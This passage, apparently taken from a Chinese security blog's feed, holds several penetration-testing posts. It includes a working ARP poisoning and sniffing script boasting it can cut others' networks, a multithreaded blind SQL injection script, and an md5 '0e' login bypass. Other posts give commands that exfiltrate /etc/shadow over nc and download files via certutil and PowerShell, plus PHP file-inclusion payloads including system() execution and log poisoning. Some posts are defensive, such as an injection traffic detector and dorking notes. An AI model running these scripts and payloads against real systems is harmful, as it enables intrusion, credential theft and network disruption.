    <content type="text"><![CDATA[测试代码： if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) { $logined = true; $Username = $_GET[&apos;Username&apos;]; $password = $_GET[&apos;password&apos;]; if (!ctype_alpha($Username)) {$logined = false;} if (!is_numeric($password) ) {$logined = false;} if (md5($Username) != md5($password)) {$logined = false;} if ($logined){ echo &quot;successful&quot;; } else { echo &quot;login failed!&quot;; } } 在做用户登录的时候常常会用到md5加密计算比较密码，md5后相等，就可以成功执行下一步语句，登录成功。但是这样做并不安全，因为 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。 md5开头是0e的字符串:QNKCDZO： 0e830400451993494058024219903391 s878926199a： 0e545993274517709034328855841020 s155964671a： 0e342768416822451524974117254469 s214587387a： 0e848240448830537924465865611904 s214587387a： 0e848240448830537924465865611904 s878926199a： 0e545993274517709034328855841020 s1091221200a： 0e940624217856561557816327384675 解决方案使用全等 ===]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[比二分法更OK的盲注多线程]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[废话不多说，直接上脚本： import threading import requests user_agent = [ &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot; ] class MyThread(threading.Thread): def __init__(self, func, args): threading.Thread.__init__(self) self.func = func self.args = args def getresult(self): return self.res def run(self): self.res = self.func(*self.args) def asc(a,i,payload): asci = 2**i url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot; header = {&apos;User-Agent&apos;: user_agent[i]} html = requests.get(url, headers=header) if html.text.find(&quot;You are in...........&quot;)!=-1: return asci return 0 def main(): payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;) a=1 f=True char = &apos;&apos; while f: threads = [] sum = 0 for i in range(0,8): t = MyThread(asc, (a, i, payload)) threads.append(t) for i in range(0,8): threads[i].start() for i in range(0,8): threads[i].join() sum = sum + threads[i].getresult() if sum ==0: f = False char = char +chr(sum) a = a+1 print(char) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python实现ARP攻击]]></title>
    <url>%2F2018%2F12%2F03%2Fpython%E5%AE%9E%E7%8E%B0ARP%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[from scapy.all import * import os import sys import threading import signal interface = &apos;Realtek PCIe GBE Family Controller&apos; target_ip=&apos;10.60.17.12&apos; gateway_ip=&apos;10.60.17.1&apos; packet_count=1000 #设置嗅探的网卡 conf.iface=interface #关闭输出 conf.verb = 0 print(&apos;[*]Setting up&apos;+interface) def restore_target(gateway_ip, gateway_mac, target_ip, target_mac): print(&apos;[*]Restoring target.....&apos;) send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5) send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5) #发送退出信号到主线程 os.kill(os.getpid(),signal.SIGINT) def get_mac(ip_address): responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10) for s, r in responses: return r[Ether].src return None def poison_target(gateway_ip, gateway_mac, target_ip, target_mac): poison_target = ARP() poison_target.op = 2 poison_target.psrc = gateway_ip poison_target.pdst = target_ip poison_target.hwdst = target_mac poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = target_ip poison_gateway.pdst = gateway_ip poison_gateway.hwdst = gateway_mac print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;) while True: try: send(poison_target) send(poison_gateway) time.sleep(2) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) print(&quot;[*] ARP poison attack finished.&quot;) return gateway_mac = get_mac(gateway_ip) if gateway_mac is None: print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;) sys.exit(0) else: print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac)) target_mac = get_mac(target_ip) if target_mac is None: print(&apos;[!!!]Faile to get target MAC. Exiting&apos;) sys.exit(0) else: print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac)) #开启ARP攻击线程 poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac)) poison_thread.start() try: print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count) bpf_filter = &apos;ip host %s&apos;%target_ip packes = sniff(count=packet_count,filter=bpf_filter,iface=interface) #将捕获到的数据包传输到文件 wrpcap(&apos;arper.pcap&apos;,packes) #还原网络配置 restore_target(gateway_ip,gateway_mac,target_ip,target_mac) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) sys.exit(0) 好了，现在可以断别人网了….]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于流量分析的SQL注入检测]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[#encoding=utf-8 from scapy.all import * import re import datetime &apos;&apos;&apos; TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。 每一个协议层都是Packet类的子类。 协议层背后所有逻辑的操作都是被Packet类和继承的类所处理的。 一个简单的协议层是由一系列的字段构成，他们关联在一起组成了协议层，解析时拆分成一个一个的字符串。 这些字段都包含在名为fields_desc的属性中。 &apos;&apos;&apos; def test(page): &apos;&apos;&apos; 第一层是数据链路层，第二层是ip层，第三层是tcp层——&gt;包含端口号、http报文,第四层是应用层 其中每一层均为上一层的payload成员 &apos;&apos;&apos; for f in page.payload.payload.payload.fields_desc: # f.name为Raw的字段名称——&gt;load：传输的http请求信息 fvalue = page.payload.payload.getfieldval(f.name) reprval = f.i2repr(page.payload.payload, fvalue) # 转换成十进制字符串 if &apos;HTTP&apos; in reprval: lst = str(reprval).split(r&apos;\r\n&apos;) la = re.findall(&apos;(GET )|(POST )&apos;, lst[0]) if la != []: if la[0][0] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): if fi.strip(&apos;\n&apos;) in str(lst[-1]).lower(): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) print(&apos;[*]攻击时间是\t&apos;+str(i)) beiattack = re.findall(&apos;Host: \w{3}\.\w{3}\.\w{3}\.\w{3}&apos;, str(lst)) print(&apos;[*]被SQL注入攻击的IP为\t&apos; + beiattack[0].strip(&quot;Host: &quot;)) print(&apos;[*]攻击的payload是\t&apos; + lst[-1].strip(&apos;\&apos;&apos;)) print(&apos;[*]提交的方式为\tPOST&apos;) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n [*]攻击时间是\t%s\n[*]被SQL注入攻击的IP为\t%s\n[*]攻击的payload是\t%s\n[*]提交的方式为\t POST\n\n&quot; % ( str(i),beiattack[0], lst[-1])) except: pass if la[0][1] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): if fi.strip(&apos;\n&apos;) in str(lst[0]).lower(): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) beiattack = re.findall(&apos;Host: \w{3}\.\w{3}\.\w{3}\.\w{3}&apos;, str(lst)) print(&apos;[*]攻击时间是\t&apos;+str(i)) print(&apos;[*]被SQL注入攻击的IP为\t&apos; + beiattack[0].strip(&quot;Host: &quot;)) print(&apos;[*]攻击的payload是\t&apos;+ lst[0].strip(&apos;\&apos;GET &apos;)) print(&apos;[*]提交的方式为\tGET&apos;) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n[*]攻击时间是\t%s\n [*]被SQL注入攻击的IP为\t%s\n[*]攻击的payload是\t%s\n[*]提交的方式为\t GET\n\n&quot; % ( str(i),beiattack[0], lst[0])) except: pass def main(): #无限抓取通过VMware Virtual Ethernet Adapter for VMnet8网卡的80端口的数据包并传给回调函数test a = sniff(filter=&apos;host 192.168.209.137&apos;, iface=&quot;VMware Virtual Ethernet Adapter for VMnet8&quot;, prn=test, count=0) if __name__ == &apos;__main__&apos;: main() sql.txt：提供特殊字段检测的字典。 Danger.log：如果有SQL注入攻击，则保存攻击时间、被攻击的IP、攻击的payload和提交的方式。]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网文件传输]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%2F</url>
    <content type="text"><![CDATA[文件传输方法：windowsFTPftp -s:1.txt【-s将后面跟的1.txt内容全部当做命令行执行】（FTP传文件比较万能，任意类型文件都可上传） 实践：现有公网IP: 101.198.183.60，内网IP: 192.168.0.84的开发webloginc 7001端口并且有反序列化漏洞的主机一台，以及 公网IP: 101.198.183.68，内网IP: 192.168.0.98开放ftp服务的主机一台。 实施攻击的是不同网段的win7攻击机（可以访问公网，但是内网不可访问）。 开启FTP服务： 使用win7攻击机上的WebLogicExploit工具远程连接weblogic主机 1、echo open 192.168.0.98 2121 &gt;&gt; 1.txt //登陆FTP服务器 2、echo guoxiang&gt;&gt;1.txt //用户名 3、echo password&gt;&gt;1.txt //密码 4、echo bin&gt;&gt;1.txt //开始 5、echo put C:\Oracle\Middleware\user_projects\domains\college\security\SerializedSystemIni.dat&gt;&gt; 1.txt //下载程序 6、echo bye&gt;&gt;1.txt //关闭FTP服务器 然后执行ftp -s:1.txt 发现在ftp主机中出现了上传的文件。 用同一内网下含有反序列化任意命令执行漏洞的weblogic主机做跳板，用weblogic主机去攻击同一内网下的ftp主机。 VBSecho 下载文件程序&gt;&gt;loader.vbs cscript loader.vbs远程文件位置保存文件位置 echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; loader.vbs cscript loader.vbs http://192.168.0.98:7001/test/putty.exe C:\Users\linghuchong\Desktop\Tools\putty.exe putty.exe Powershellpowershell-exec bypass-c（new-object System.Net.WebClient）.DownloadFile（“远程文件位置“保存文件位置） powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&apos;http://192.168.111.1:8080/test/putty.exe&apos;,&apos;C:\Users\linghuchong\Desktop\Tools\putty1.exe&apos;) putty1.exe certaincertutil.exe -urlcache -split -f 远程文件位置 certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete //删除缓存 putty.exe Linux攻击端监听端口，并重定向： nc -nvv -lp 4455 &gt; shaodw.txt 目标机将文件内容回传： nc 192.168.111.251 4455 &lt; /etc/shadow Wget（下载）wget http://192.168.111.1:8080/test/putty.exe curl支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 curl -O http://192.168.111.1:8080/test/putty.exe]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎——永不过时的渗透神器]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E2%80%94%E2%80%94%E6%B0%B8%E4%B8%8D%E8%BF%87%E6%97%B6%E7%9A%84%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Google Hacking使用Google搜索引擎或其他Google应用程序通过特定语法来查找网站配置或代码中的安全漏洞搜索登录后台、特定文件、漏洞贡面、错误信息等等 逻辑运算符： +强制搜索其后的一个单词 -把某个字忽略 ~ 同意词博客设置 .单一的通配符 * 通配符，可代表多个字母 “” 精确查询 I 或 OR 只要符合多个关键字中的任意一个的结果予以显示 基本语法：intext:key 搜索网页带有关键字的页面 allintext:key 功能与intext，但是可以接多个关键字 intitle:key 搜索网页标题中是否有所输入的文字 allintitle:key 功能与intext，可以接多个关键字，但不能与别的关键字连用 Index of/(例如：index of/login) 使用它可以直接进入网站首页下的所有文件和文件夹中。（可以查看有没有目录遍历漏洞） cache:url 查看指定URL快照 filetype： 搜索指定类型文件 info： 搜索输入URL的摘要信息和其他相关信息，不能与其他关键词混用 inurl： 搜索输入字符是否存在于URL中，可以与site结合找后台 site： 搜索特定网站或者子域名 related:URL 搜索与该URL相关的页面 Link： link:thief.one可以返回所有和thief.one做了链接的URL。 搜索不同地域网站 inurl:tw 台湾 inurl:jp 日本 Google hacking语法数据库https://www.exploit-db.com/google-hacking-database/ 利用Google搜索C段服务器信息site:218.87.21.* 通过google可获取218.87.21.0/24网络的服务信息。 网络空间搜索引擎网络空间搜索引擎不同于搜索普通网页，而是直接搜索网络中存在主机，将主机信息汇聚成数据库，然后显示出主机的IP、端口、中间件、摄像头，工控设备banner、等其他网络设备信息。 同时可以按照普通搜索引擎规则来搜索网络设备：ip:&quot;192.168.1.0&quot;。 常见的搜索引擎：用法大多相同，这里只写shodan的用法。其他类比。 国内： zoomeye：（https://www.zoomeye.org/） fofa 国外： shodan（俗称黑暗谷歌） shodanhttps://www.shodan.io/ shoadn一刻不停的寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。 凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到 shodan可以在windows下网页中运行，也可以在linux下安装运行。 基本语法： hostname： 搜索指定的主机或域名，例如 hostname:”google” port： 搜索指定的端口或服务，例如 port:”21” country： 搜索指定的国家，例如 country:”CN” city： 搜索指定的城市，例如 city:”Hefei” org： 搜索指定的组织或公司，例如 org:”google” isp： 搜索指定的ISP供应商，例如 isp:”China Telecom” product： 搜索指定的操作系统/软件/平台，例如 product:”Apache httpd” version： 搜索指定的软件版本，例如 version:”1.6.2” geo： 搜索指定的地理位置，例如 vgeo:”31.8639, 117.2808” before/after： 搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”v net： 搜索指定的IP地址或子网，例如 net:”210.45.240.0/24” http.favicon.hash方法可以来搜索使用同一icon图标的网站。如果我想搜索带有这个icon的所有ip地址的话，可以先在Shodan搜索这个ip，这里要用到一个之前没注意到的东西，就是Shodan的原始数据（Raw Data）功能， 这里面有很多原始数据。 从中找到相应：data.0.http.favicon.hash字段 通过命令： http.favicon.hash:600245583 命令： net:&quot;114.242.146.0/24&quot; 命令： os:&quot;windows 7&quot; country:&quot;CN&quot; city:&quot;beijing&quot; 不仅可以运用标准操作。还可以直接搜索功能 在linux下得先对shodan进行安装pip install shodan 然后初始化shodan shodan init ‘key’ 这里的key是注册shodan账号时候给你的 count：统计结果 download：下载数据，数据格式json shodan parse --fields ip_str,port waiwang.json parse：解析json数据。 而且只取ip_str和port字段的值 shodan parse --fields ip_str,port waiwang.json |grep 80 shodan host 114.242.146.192 host：搜索指定IP shodan myip shodan search --fields ip_str,port net:&apos;114.242.146.0/24&apos; search：搜索内容]]></content>
      <categories>
        <category>Google Hacking</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[内网渗透——端口转发工具]]></title>
    <url>%2F2018%2F12%2F02%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[Htranhttps://github.com/zcnhonker/HTran 正向端口转发服务端 htran.exe -tran 8888 192.168.1.1 3389 客户端 nc 服务端IP:8888 反向端口转发攻击机 htran.exe -listen 1234 8888 服务端 htran.exe -slave 攻击机IP 1234 127.0.0.1 3389 客户端 nc 127.0.0.1：8888 lcxhttps://guolala.top/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/ Netshnetsh(Network Shell) 是一个windows系统本身提供的功能强大的网络配置命令行工具 Ipv4地址，转发本地8001端口到192.168.1.1的80端口 netsh interface portproxy add v4tov4 listenport=8001 connectport=80 connectaddress=192.168.1.1 删除转发规则 netsh interface portproxy delete v4tov4 listenport=9090查看现有规则 netsh interface portproxy show all 查看防火墙状态 netsh firewall show state netsh firewall set opmode disable 关闭防火墙 netsh firewall set opmode enable 启用防火墙 FpipeFPipe 是一款命令行下的端口映射工具，可以映射 TCP/UDP 协议，支持连接数的最大上限. 转发本地1080端口到远程的52345端口： FPipe.exe -l 1080 -r 52345 192.168.1.1 -v socks代理Socks代理相对端口转发更万便一些 reGeorgwindows下https://github.com/sensepost/reGeorg.git 这款工具的主要特点是服务端通常是一些web应用，例如php、aspx脚本。这样在目标仅仅开启了web服务的情况下我们也能做一个正向的socks代理。 它利用webshell建立一个socks代理进行内网穿透。 使用reGeorg需要安装setuptools（windows）和ez_setup.py（linux） https://pypi.python.org/pypi/setuptools#windows-simplified https://bootstrap.pypa.io/ez_setup.py 将setuptools 复制到 C:\Python27\（复制到python安装根目录）在命令提示符下切换到C:\Python27\，依次运行如下命令。 python setup.py build python setup.py install setuptools包含了pip，可直接用pip安装urllib3模块。命令提示符下切换到C:\Python27\Scripts，直接运行pip install urllib3 reGeorg工具安装完成。 使用参数 -h 帮助 -l 监听地址 -p 转发端口 -r 本地缓冲区，最大发送数据 -u 上传reGeorg脚本的地址 -v 详细显示 使用方法： 将下载内容的tunnel.jsp压缩（看网站），通过weblogic（各种文件上传）上传至服务器。 本地建立一个socks代理 切换到C:\Python27\，运行: python reGeorgSocksProxy.py -p 2333 -u http://192.168.209.159:7001/tunnel/tunnel.jsp 再用proxifier配置服务器 将python.exe添加列外，不然会死循环。 reGeorg在设计初，并未考虑Java中间件的问题，测试结果暂时支持Tomcat，所以如果服务器是Weblogic等中间件时候，可能会造成暂时无法访问3389远程桌面，或者卡在远程桌面 kali下使用代理vi proxychains.conf //编辑配置文件 dynamic_chain //取消此注释 socks5 127.0.0.1 7070 //添加代理 proxychains firefox proxychains nmap -vvv -n -sT -PN -p 80 192.168.0.1-255 rtcp.py利用 Python 的 Socket 端口转发，用于远程维护 如果连接不到远程，会 sleep 36s，最多尝试 200 次（即两小时） https://github.com/knownsec/rtcp 用法： ./rtcp.py stream1 stream2 stream 为：l:port 或 c:host:port l:port 表示监听指定的本地端口 c:host:port 表示监听远程指定的端口 转发本地8080端口到192.168.1.1的80端口 /rtcp.py 1:8080 c:192.168.1.1:80 使用场景： A 服务器在内网，公网无法直接访问这台服务器，但是 A 服务器可以联网访问公网的 B 服务器（假设 IP 为 222.2.2.2） 我们也可以访问公网的 B 服务器。我们的目标是访问 A 服务器的 22 端口。那么可以这样： 在 B 服务器上运行：./rtcp.py l:10001 l:10002 表示在本地监听了 10001 与 10002 两个端口，这样，这两个端口就可以互相传输数据了 在 A 服务器上运行：./rtcp.py c:localhost:22 c:222.2.2.2:10001 表示连接本地的 22 端口与 B 服务器的 10001 端口，这两个端口也可以互相传输数据了 然后我们就可以这样来访问 A 服务器的 22 端口了：ssh -p 10002 222.2.2.2 原理很简单，这个命令执行后，B 服务器的 10002 端口接收到的任何数据都会传给 10001 端口 此时，A 服务器是连接了 B 服务器的 10001 端口的，数据就会传给 A 服务器，最终进入 A 服务器的 22 端口 ssh+putty转发先安装： apt-get install putty 打开putty，配置SSH 配置SSH隧道 连接SSH并登录，保持窗口不关闭 访问8888端口——&gt;7001端口。 socat转发安装socat apt-get install socat 添加转发规则 socat TCP4-LISTEN:7777,reuseaddr,fork TCP4:192.168.0.92:7001 访问7777——&gt;7001. Earthworm：跨平台内网穿透神器基于标准C开发，具有socks5代理、端口转发和端口映射三大功能。 支持多平台，可穿透复杂的内网环境 https://github.com/rootkiter/EarthWorm 使用方法： -h 查看帮助 -s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran) ssocksd：正向socks5代理连接; rcsocks、rssocks：反向socks5代理连接; lcx_slave、lcx_listen：端口转发; lcx_tran：端口映射 -l 开放指定端口监听 -d 指定转发或反弹的主机地址 -e 指定转发或反弹的主机端口 -f 指定连接或映射的主机地址 -g 指定连接或映射的主机端口 -t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，-h显示有误)； -v 显示版本； -a 显示关于页面； 正向socks5代理(适用于目标拥有公网ip且可任意开监听端口)ew_for_Win.exe -s ssocksd -l 1080 在公网主机1.1.1.1上运行并开启端口为1080的socks5代理。 通过proxifier等代理工具访问1.1.1.1:1080使用1.1.1.1主机提供的socks5代理服务. 反向socks5代理(适用于目标无公网ip但可访问外网)：先在一台具有公网 ip 的主机A上运行以下命令： 在公网主机上添加转接隧道，将1080端口收到的代理请求转交给反弹到8888端口的主机。 相通机器：ew_for_Win.exe -s rcsocks -l 1080 -e 8888 将rcsocks改成lcx_listen也同样有效 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口： 在目标主机上开启socks5代理并反向连接到公网主机1.1.1.1的8888端口上。 目标主机：ew_for_Win.exe -s rssocks -d 1.1.1.1 -e 8888 通过proxifier等代理工具访问1.1.1.1:1080使用rssocks主机提供的socks5代理服务。 多级级联lcx_slave、lcx_listen、lcx_tran用法跟lcx一样。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件包含漏洞详解]]></title>
    <url>%2F2018%2F12%2F02%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。 require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。 require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。 接下来的测试会用下面这个非常简单的代码进行： &lt;?php $file = $_GET[&apos;file&apos;]; include $file; ?&gt; 同目录下有一个phpinfo.txt文件（内容为&lt;?php phpinfo();?&gt;） 文件包含有两种：本地文件包含、远程文件包含 （即加载远程文件，在php.ini中开启allow_url_include、allow_url_fopen选项。开启后可以直接执行任意代码。） 漏洞成因：程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞。 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[‘file’];。 php的文件包含利用在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 读取敏感文件访问：http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。 远程包含shell allow_url_fopen = On allow_url_include = On 在远程文件http://10.60.17.60里写入测试代码。 &lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt; 访问http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：”&lt;?php phpinfo(); ?&gt;“ 图片上传并包含图片shell利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。 SSH log利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost 之后会提示输入密码等等，随便输入。 然后在remotehost的ssh-log中即可写入php代码： 之后进行文件包含即可。 包含日志文件GetShell利用条件：需要知道服务器日志的存储路径，且日志文件可读。 既然存在文件包含漏洞就可以利用漏洞读取apache的配置文件找到日志文件的位置。（默认：包含日志文件GetShell） 很多时候，web服务器会将请求写入到日志文件中，比如说apache。在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/。 但如果是直接发起请求，会导致一些符号被编码使得包含无法正确解析。可以使用burp截包后修改. 正常的php代码已经写入了 /var/log/apache2/access.log。然后进行包含即可。 在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。 长度截断利用条件： php版本 &lt; php 5.2.8 目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复./ index.php?file=././././省略././shell.txt 0字节截断包含利用条件： php版本 &lt; php 5.3.4 测试代码： &lt;?php $file = $_GET[&apos;file&apos;]; include $file.&apos;/tasdas/asd.php&apos;; ?&gt; http://127.0.0.1/123.php?file=phpinfo.txt%00 正常上传图片一句话并访问：http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中magic_quotes_qpc=off并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。 伪协议PHP伪协议其实就是PHP支持的协议和封装的协议， file: — 访问本地文件系统 http: — 访问 HTTP(s) 网址 ftp: — 访问 FTP(s) URLs php: — 访问各个输入/输出流（I/O streams）【php://stdin 是只读的， php://stdout 和 php://stderr 是只写的】 zlib: — 压缩流 data: — 数据（RFC 2397） glob: — 查找匹配的文件路径模式 phar: — PHP 归档 ssh2: — Secure Shell 2 rar: — RAR ogg: — 音频流 expect: — 处理交互式的流 有两个比较重要的配置在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen和include等等函数对于伪协议的支持，而allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的。 File://用于访问文件系统。（可用于任意文件执行），在allow_url_fopen 和allow_url_include任何状态下都可以用。 data:// php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt; 任意命令执行 http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt; 利用base64编码绕过 http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：&lt;?php phpinfo();?&gt; phar://php版本大于等于php5.3.0 在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。 使用绝对路径： http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt 或者使用相对路径： http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt zip:// – zlib:// –bzip2:// –zip://php版本大于等于php5.3.0 构造zip包的方法同phar 但是使用zip协议，需要指定绝对路径，同时将#编码为%23，之后填上压缩包内的文件。 http://127.0.0.1/123.php?file=zip://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt http://127.0.0.1/123.php?file=zip://phpinfo.zip%23phpinfo.txt http://127.0.0.1/123.php?file=zip://./phpinfo.zip%23phpinfo.txt 压缩流：在allow_url_fopen 和allow_url_include任何状态下都可以用。 使用方法： http://127.0.0.1/test/1.php?f=zip://./1.zip%231.txt http://127.0.0.1/test/1.php?f=zip:///Applications/MAMP/htdos/test/1.zip%231.txt http://127.0.0.1/test/1.php?f=file=compress.bzip2:///Applications/MAMP/htdos/test/file.jpg http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg 另一种思路：将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩，压缩文件 